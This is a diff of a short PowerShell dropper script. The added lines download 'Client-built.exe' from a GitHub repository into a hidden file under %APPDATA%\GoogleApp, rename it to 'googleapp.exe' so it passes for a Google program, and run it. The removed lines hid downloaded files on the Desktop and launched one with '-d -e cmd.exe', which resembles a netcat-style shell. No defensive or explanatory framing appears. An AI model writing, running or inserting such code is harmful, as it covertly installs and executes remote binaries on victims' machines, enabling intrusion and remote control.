@@ -1,19 +1,14 @@
-$url = ""
-$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
-$filename = ""
-$finalPath = Join-Path - Path $desktopPath -Childpath $filename
+$url = "https://github.com/ioik432/powershell/raw/main/Client-built.exe"
 
-$url2 = ""
-$filename2 = ""
-$finalPath2 = Join-Path -Path $desktoPPath -ChildPath $filename2
+$finalPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\Client-built.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $finalPath
+
 Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
-Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
-Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+$nyttNamn = "googleapp.exe"
+$nyttNamnPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\$nyttNamn"
 
-$params = "-d -e cmd.exe"
+Rename-Item -Path $finalPath -NewName $nyttNamn
 
-Start-Process -FilePath $finalPath -ArgumentList $params
-Start-Process $finalPath2
+Start-Process -FilePath $nyttNamnPath
